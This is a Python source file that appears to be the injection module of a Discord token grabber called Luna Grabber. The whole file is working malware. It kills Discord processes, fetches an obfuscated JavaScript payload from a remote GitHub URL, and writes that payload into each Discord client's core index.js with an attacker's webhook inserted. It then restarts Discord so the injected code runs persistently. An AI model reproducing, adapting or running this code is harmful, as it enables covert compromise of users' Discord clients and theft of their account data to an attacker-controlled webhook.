import os
import psutil
import re
import requests
import subprocess

class Injection:
	def __init__(self, webhook: str) -> None:
		self.appdata = os.getenv('LOCALAPPDATA')
		self.discord_dirs = [
			self.appdata + '\\Discord',
			self.appdata + '\\DiscordCanary',
			self.appdata + '\\DiscordPTB',
			self.appdata + '\\DiscordDevelopment'
		]
		response = requests.get('https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js')
		if response.status_code != 200:
			return
		self.code = response.text

		for proc in psutil.process_iter():
			if 'discord' in proc.name().lower():
				proc.kill()

		for dir in self.discord_dirs:
			if not os.path.exists(dir):
				continue

			if self.get_core(dir) is not None:
				with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
					f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
					self.start_discord(dir)

	def get_core(self, dir: str) -> tuple:
		for file in os.listdir(dir):
			if re.search(r'app-+?', file):
				modules = dir + '\\' + file + '\\modules'
				if not os.path.exists(modules):
					continue
				for file in os.listdir(modules):
					if re.search(r'discord_desktop_core-+?', file):
						core = modules + '\\' + file + '\\' + 'discord_desktop_core'
						if not os.path.exists(core + '\\index.js'):
							continue
						return core, file

	def start_discord(self, dir: str) -> None:
		update = dir + '\\Update.exe'
		executable = dir.split('\\')[-1] + '.exe'

		for file in os.listdir(dir):
			if re.search(r'app-+?', file):
				app = dir + '\\' + file
				if os.path.exists(app + '\\' + 'modules'):
					for file in os.listdir(app):
						if file == executable:
							executable = app + '\\' + executable
							subprocess.call([update, '--processStart', executable],
											shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)